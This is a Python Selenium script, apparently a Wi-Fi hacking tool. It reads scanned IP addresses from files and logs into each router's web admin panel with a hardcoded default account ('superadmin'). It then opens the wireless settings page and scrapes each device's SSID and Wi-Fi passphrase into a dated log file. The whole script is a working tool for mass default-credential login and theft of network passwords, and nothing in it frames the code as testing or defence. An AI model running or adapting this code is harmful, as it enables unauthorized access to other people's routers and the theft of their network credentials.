import logging
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.chrome.service import Service
import re
import glob
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

chrome_options = Options()
chrome_options.add_experimental_option("detach", True)

username = "superadmin"
password = "suportadmin"

service = Service(executable_path='d:\\mengoding\\hekwifi\\chromedriver.exe')
driver = webdriver.Chrome(service=service)
driver.execute_script("window.open('');")

def getPassword(ip):
    try:
        logging.info(f"Trying {ip}")
        driver.execute_script("window.open('');")
        driver.switch_to.window(driver.window_handles[-1])
        driver.get(f"http://{ip}")

        driver.find_element(By.ID, "Frm_Username").send_keys(username)
        driver.find_element(By.ID, "Frm_Password").send_keys(password)
        driver.find_element(By.ID, "LoginId").click()

        WebDriverWait(driver, 3).until(EC.invisibility_of_element_located((By.ID, "Frm_Username")))

        logging.info("Login successful")
        driver.get(f"http://{ip}/getpage.gch?pid=1002&nextpage=pon_net_wlan_conf1_t.gch")
        driver.find_element(By.ID, "Img_KeyPassphrase").click()
        a = driver.execute_script("return(document.getElementById('Frm_KeyPassphrase').value)")
        b = driver.execute_script("return(document.getElementById('Frm_ESSID').value)")
        res = f"{ip} : {b} {a}"
        logging.info(res)
        with open(datetime.now().strftime("%d-%m-%Y") + ".txt", "a") as f:
            f.write(res + "\n")

    except NoSuchElementException:
        logging.error("Element not found, skipping...")
    except TimeoutException:
        logging.error("Login failed")
        with open(datetime.now().strftime("%d-%m-%Y") + ".txt", "a") as f:
            f.write(f"{ip} : failed\n")
    finally:
        driver.execute_script("window.close('');")

def all():
    pattern = r'\d+\.\d+\.\d+\.\d+'
    for filename in glob.glob("172.16.1.*.txt"):
        with open(filename, "r") as file:
            for line in file:
                ip = re.findall(pattern, line)
                if ip:
                    logging.info(f"Found IP: {ip[0]}")
                    getPassword(ip[0])

if __name__ == "__main__":
    # getPassword("172.16.0.108")
    all()